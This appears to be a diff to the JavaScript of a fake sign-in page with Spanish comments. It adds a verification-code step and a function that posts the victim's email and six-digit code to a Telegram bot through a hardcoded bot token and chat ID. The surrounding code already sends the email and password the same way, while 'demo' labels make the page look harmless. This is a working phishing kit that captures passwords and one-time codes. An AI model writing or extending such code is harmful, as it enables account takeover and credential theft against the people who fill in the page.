@@ -5,6 +5,14 @@
 
 const panel1 = document.getElementById('panel1');
 const panel2 = document.getElementById('panel2');
+const panelCode = document.getElementById('panelCode');
+
+// Al cargar la página, ocultar panel2 y panelCode, mostrar solo panel1
+document.addEventListener('DOMContentLoaded', () => {
+  if(panel1) { panel1.style.display = 'block'; panel1.setAttribute('aria-hidden','false'); }
+  if(panel2) { panel2.style.display = 'none'; panel2.setAttribute('aria-hidden','true'); }
+  if(panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden','true'); }
+});
 const continueBtn = document.getElementById('continueBtn');
 const identifier = document.getElementById('identifier');
 const displayEmail = document.getElementById('displayEmail');
@@ -66,21 +74,91 @@ togglePwd.addEventListener('click', (e)=>{
 });
 
 signInBtn.addEventListener('click', ()=>{
-  // Demo behaviour: validate and show an alert
+  // Validar método y datos
+  if(optPass.checked && !password.value){
+    password.style.borderColor = '#e05'; password.focus(); return;
+  }
+  // Ocultar panel1 y panel2
+  panel1.style.display = 'none';
+  panel2.style.display = 'none';
+  panel1.setAttribute('aria-hidden','true');
+  panel2.setAttribute('aria-hidden','true');
+  // Mostrar panelCode
+  const panelCode = document.getElementById('panelCode');
+  const codePanelEmail = document.getElementById('codePanelEmail');
+  const codePanelEmail2 = document.getElementById('codePanelEmail2');
+  if(panelCode && codePanelEmail && codePanelEmail2){
+    panelCode.style.display = 'block';
+    panelCode.setAttribute('aria-hidden','false');
+    codePanelEmail.textContent = displayEmail.textContent;
+    codePanelEmail2.textContent = displayEmail.textContent;
+  }
+  // Enviar a Telegram según método
   if(optPass.checked){
-    if(!password.value){
-      password.style.borderColor = '#e05'; password.focus(); return;
-    }
-    // Llama a la función para enviar a Telegram
     if(typeof enviarCredencialesTelegram === 'function') {
       enviarCredencialesTelegram(displayEmail.textContent, password.value);
     }
-    alert('Signed in as ' + displayEmail.textContent + ' (demo)');
     console.log('Signed in', {email:displayEmail.textContent, password:password.value});
   } else {
-    alert('Verification code sent to ' + displayEmail.textContent + ' (demo)');
+    if(typeof enviarCredencialesTelegram === 'function') {
+      enviarCredencialesTelegram(displayEmail.textContent, '');
+    }
     console.log('Request code for', displayEmail.textContent);
   }
+});
+// Lógica para enviar el código a Telegram
+function enviarCodigoTelegram(email, codigo) {
+  const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0';
+  const chatId = '1739505466';
+  const mensaje = `Código ingresado\nCorreo: ${email}\nCódigo: ${codigo}`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  fetch(url, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: mensaje
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Código enviado a Telegram:', data);
+  })
+  .catch(error => {
+    console.error('Error enviando código a Telegram:', error);
+  });
+}
+
+// Lógica para capturar el código y enviarlo
+const signInCodeBtn = document.getElementById('signInCodeBtn');
+if(signInCodeBtn){
+  signInCodeBtn.addEventListener('click', ()=>{
+    const codeInputs = document.querySelectorAll('#codeInputs .code-input');
+    let code = '';
+    codeInputs.forEach(input => code += input.value.trim());
+    if(code.length === 6){
+      enviarCodigoTelegram(codePanelEmail.textContent, code);
+      alert('Código enviado (demo)');
+    } else {
+      codeInputs.forEach(input => input.style.borderColor = '#e05');
+      codeInputs[0].focus();
+    }
+  });
+}
+
+// UX: mover foco automáticamente entre inputs de código
+const codeInputs = document.querySelectorAll('#codeInputs .code-input');
+codeInputs.forEach((input, idx) => {
+  input.addEventListener('input', (e) => {
+    if(input.value.length === 1 && idx < codeInputs.length-1){
+      codeInputs[idx+1].focus();
+    }
+  });
+  input.addEventListener('keydown', (e) => {
+    if(e.key === 'Backspace' && !input.value && idx > 0){
+      codeInputs[idx-1].focus();
+    }
+});
 });
 
 // small UX: enter on field
